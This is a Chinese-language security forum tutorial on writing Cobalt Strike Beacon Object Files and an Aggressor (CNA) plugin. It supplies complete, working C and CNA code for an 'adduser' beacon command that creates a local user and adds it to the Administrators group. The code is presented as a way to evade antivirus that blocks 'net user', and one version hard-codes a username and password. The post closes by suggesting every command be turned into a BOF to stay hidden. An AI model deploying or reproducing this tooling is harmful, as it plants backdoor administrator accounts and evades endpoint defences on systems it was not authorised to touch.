# BOF及cna插件开发初探

> **来源**: https://forum.butian.net/share/3003  
> **文章ID**: 3003

---

Beacon Object File
==================

bof能够加载并执行C/C++编译后但未链接的目标obj文件(linux中的.o文件)。可以在beacon中执行内部的beaconAPI和Win32API。它的体积很小，在beacon进程内部运行，不会创建新进程，所以可以有效的规避一些EDR。

开发BOF
=====

环境
--

```php
OS: Windows 10
IDE: VS2022
开发模版: https://github.com/securifybv/Visual-Studio-BOF-template
```

将模版下载后，我们导入VS的模版目录。 `用户路径\\文稿\\Visual Studio 2022\\Templates\\ProjectTemplates` 然后在新建项目中就能看到模版

![image.png](images/attach-9a7852394c13608550c5d9e54e6a2143a0f6720f.png)  
然后在生成->批生成中勾选，方案配置选择BOF

![image.png](images/attach-dfa6e25a9d6e84fd319f80c2b0631595c6f8f7b4.png)  
然后生成，就能够在项目目录里看到obj文件

![image.png](images/attach-e87abe9ed62ae8d0aac67fe4ea8b873921e98b4b.png)

功能实现
----

首先了解一下动态函数解析(DFR) 比如我们要获取当前用户名，在Win32API中就要调用GetUserNameA​，我们使用DFR就是要变成如下格式

```php
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
```

- DECLSPEC\_IMPORT：导入函数的关键字
- WINAPI：函数调用约定，一般API函数都是这个
- ADVAPI32：函数所在的模块名
- GetUserNameA：函数名称

查找当前域
-----

简单实现一个查找当前域功能 修改模版中Source.c​

```C
#include <windows.h> 
#include <stdio.h> 
#include <dsgetdc.h> 
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
    DWORD dwRet;
    PDOMAIN_CONTROLLER_INFO pdcInfo;
    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdcInfo);
    if (ERROR_SUCCESS == dwRet) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", pdcInfo->DomainName);
    }
    NETAPI32$NetApiBufferFree(pdcInfo);
}
#else

void main(int argc, char* argv[]) {

}

#endif
```

![image.png](images/attach-7424760eed68a0e99013b68454111f67a74c5fa8.png)  
于此我们也可以发现，go函数就是bof执行的入口，当在cs的beacon上执行inline-execute时就会调用go函数。

bof绕过杀毒添加用户
-----------

我们在cs上直接利用`net user`会被阻止

![image.png](images/attach-9540692a2bf7cd5637384448c0af0362978f88f2.png)  
但是我们如果采用bof的方式就能够绕过 代码如下

```C
#include <windows.h> 
#include <stdio.h> 
#include "bofdefs.h"
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
  USER_INFO_1 UserInfo;

  UserInfo.usri1_name = L"Qqw666";            
  UserInfo.usri1_password = L"Qqw@#123";      
  UserInfo.usri1_priv = USER_PRIV_USER;
  UserInfo.usri1_home_dir = NULL;
  UserInfo.usri1_comment = NULL;
  UserInfo.usri1_flags = UF_SCRIPT;
  UserInfo.usri1_script_path = NULL;

  NET_API_STATUS nStatus;

  //创建用户 
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
  nStatus = NETAPI32$NetUserAdd(
    NULL, //local server
    1,    // information level
    (LPBYTE)&UserInfo,
    NULL // error value
    );
  if (nStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Success!\n", NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Username: %ws, PassWord: %ws", UserInfo.usri1_name, UserInfo.usri1_password);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Failed! %d", nStatus);
  }

  // 添加用户到管理员组
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
  LOCALGROUP_MEMBERS_INFO_3 account;
  account.lgrmi3_domainandname = UserInfo.usri1_name;

  NET_API_STATUS aStatus;

  aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
  if (aStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators success!", NULL);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators failed!", NULL);
  }

}
#else

void main(int argc, char* argv[]) {
  go();
}

#endif
```

效果

![image.png](images/attach-70ba8fde063ff2218b9bd8403a0dd2340d2eed8c.png)  
可以看到成功添加用户，并且添加到管理员组。注意执行这个操作需要有admin的权限。

CNA插件开发
=======

先给出C语言代码，修改了功能，可以自定义用户名和密码

```C
#include <windows.h> 
#include <stdio.h> 
#include "bofdefs.h"
#include "beacon.h" 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
  //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
  BeaconPrintf(CALLBACK_OUTPUT, "Hello world");
#else
  printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

  return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include <LM.h>

#ifdef BOF
void go(char* buff, int len) {
  datap parser;

  LPWSTR username;
  LPWSTR password;

  // 初始化datap结构体变量(parser),用于解析从Beacon接收到的字节流(buff)
  BeaconDataParse(&parser, buff, len);
  username = (LPWSTR)BeaconDataExtract(&parser, NULL);
  password = (LPWSTR)BeaconDataExtract(&parser, NULL);

  BeaconPrintf(CALLBACK_OUTPUT, "Extracted username: %S", username);
  BeaconPrintf(CALLBACK_OUTPUT, "Extracted password: %S", password);

  USER_INFO_1 UserInfo;

  UserInfo.usri1_name = username;
  UserInfo.usri1_password = password;
  UserInfo.usri1_priv = USER_PRIV_USER;
  UserInfo.usri1_home_dir = NULL;
  UserInfo.usri1_comment = NULL;
  UserInfo.usri1_flags = UF_SCRIPT;
  UserInfo.usri1_script_path = NULL;

  NET_API_STATUS nStatus;

  //创建用户 
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
  nStatus = NETAPI32$NetUserAdd(
    NULL, //local server
    1,    // information level
    (LPBYTE)&UserInfo,
    NULL // error value
  );
  if (nStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Success!", NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Username: %ws, PassWord: %ws", UserInfo.usri1_name, UserInfo.usri1_password);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "NetUserAdd Failed! %d", nStatus);
  }

  // 添加用户到管理员组
  // https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
  LOCALGROUP_MEMBERS_INFO_3 account;
  account.lgrmi3_domainandname = UserInfo.usri1_name;

  NET_API_STATUS aStatus;

  aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
  if (aStatus == NERR_Success) {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators success!", NULL);
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT, "Add to Administrators failed!", NULL);
  }

}
#else

void main(int argc, char* argv[]) {
  go();
}

#endif
```

cna代码

```php
beacon_command_register(
"adduser", 
"Add a user to administrators", 
"usage: adduser [username] [password]");

alias adduser{
  local('$handle $data $args');

  $uname = $2;
  $pass = $3;

  if ($uname eq "" or $pass eq "") {
    berror($1, "usage command: help adduser");
    return;
  }

  # 读入bof文件

    $handle = openf(script_resource("source.obj"));
    $data = readb($handle, -1);
    closef($handle);

  # 打包参数两个ZZ代表两个参数
  $args = bof_pack($1, "ZZ", $uname, $pass);

    # 执行bof
     # "go"是BOF中的函数名，$args是传递给这个函数的参数
  beacon_inline_execute($1, $data, "go", $args);
}
```

效果如下

![image.png](images/attach-9c2857d5edb3cc3c11300b5468128b6bab02e4d0.png)

总结
==

可以根据此思路实现所有命令bof化，能够更好的隐藏
